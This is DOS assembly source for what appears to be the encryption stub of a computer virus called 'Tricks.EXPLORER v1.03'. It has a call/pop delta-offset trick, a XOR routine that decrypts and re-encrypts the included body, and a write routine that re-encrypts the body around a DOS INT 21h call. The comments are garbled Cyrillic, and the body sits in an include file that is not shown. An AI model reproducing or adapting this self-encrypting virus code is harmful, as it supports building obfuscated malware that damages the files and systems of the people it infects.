;************************************************
;*	Ticks.EXPLORER v1.03                    *
;************************************************
.286
TestS	segment
	assume	cs:TestS,ds:TestS,ss:TestS
	org	100h
;
Shift	= ((Next-Start)+100h)	
CryptLen= CopyRT-Crypted
;
Start:
	call	Next
Next:
	pop	si
	sub	si,Shift
	call	Crypt	
;
Crypted:
;************************************************
	include	trexp.inc ; ����஢���         *
;************************************************
CopyRT	db	0,'[Tricks.EXPLORER] v1.03',0
;
WriV:
	call	Crypt
	int	21h
	call	Crypt
	ret
;************************************************
;*	�����஢騪                            * 
;************************************************
Crypt:
	pusha
; ����砥� ����⠭�� 1
	mov	ah, 0FFh
	int	13h
; ������㥬 55h	
	mov	al, ah
	add	al, (55h-1)
;	
	lea	bx, Crypted[si]
	mov	cx, CryptLen
Circle:	
	xor	byte ptr [bx], al
	inc	bx
	loop	Circle
	popa
	ret
;
Finish:
;
Tests	ends
	End	Start
	ret
